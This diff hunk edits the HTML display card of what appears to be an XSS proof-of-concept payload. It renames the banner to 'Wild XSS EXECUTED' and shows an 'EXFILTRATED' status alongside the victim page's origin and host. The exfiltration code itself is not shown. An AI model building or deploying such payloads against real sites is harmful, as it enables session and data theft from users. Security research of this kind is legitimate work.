@@ -59,7 +59,7 @@
     + ".sec em{float:right;font-style:normal;opacity:.85}"
     + ".foot{color:" + t.val + ";font-size:11px;padding:12px 16px 14px;border-top:1px dashed " + t.acc + "55;margin-top:8px}.foot b{color:" + t.hot + ";text-shadow:0 0 6px " + t.hot + "88}</style>"
     + "<div class='card'>"
-    + "<div class='head'><span>⚡ XSS EXECUTED &nbsp;·&nbsp; by Raman_MG</span><span>" + (sent ? "◉ EXFILTRATED" : "◉ EXFIL (fetch)") + "</span></div>"
+    + "<div class='head'><span>⚡ Wild XSS EXECUTED &nbsp;·&nbsp; by Raman_MG</span><span>" + (sent ? "◉ EXFILTRATED" : "◉ EXFIL (fetch)") + "</span></div>"
     + "<table>"
     + "<tr><td class='k'>ORIGIN</td><td class='v hi'>" + enc(data.origin) + "</td></tr>"
     + "<tr><td class='k'>HOST</td><td class='v hi'>" + enc(data.host) + "</td></tr>"
